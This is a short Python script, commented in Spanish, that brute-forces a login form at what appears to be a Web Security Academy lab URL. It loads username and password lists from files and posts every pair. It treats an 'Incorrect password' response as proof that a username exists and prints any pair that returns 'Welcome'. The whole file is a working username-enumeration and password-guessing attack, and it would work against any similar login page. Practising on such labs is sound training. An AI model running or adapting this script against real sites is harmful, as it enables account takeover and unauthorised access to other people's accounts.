import requests
#URL del sitio web
url = "https://0aa600040364e3f985f20e50003d005e.web-security-academy.net/login"

with open("usuarios_noborrar.txt", "r") as users_file:
  usernames = [line.strip() for line in users_file]

with open("passwords_db.txt", "r") as passwords_file:
  passwords = [line.strip() for line in passwords_file]


#Ataque de fuerza bruta
for username in  usernames:
  for password in passwords:
    #Datos formulario
    data = {"username": username, "password": password}

    #Envio de solicitud POST
    response = requests.post(url, data=data)

    #Verificar respuestas
    if "Incorrect password" in response.text:
      print(f"Usuario valido encontrado: {username}")
      break #No prueba mas contrasenias para este usuario
    elif "Welcome" in response.text:
      print(f"Credenciales validas: {username}:{password}")
      exit()


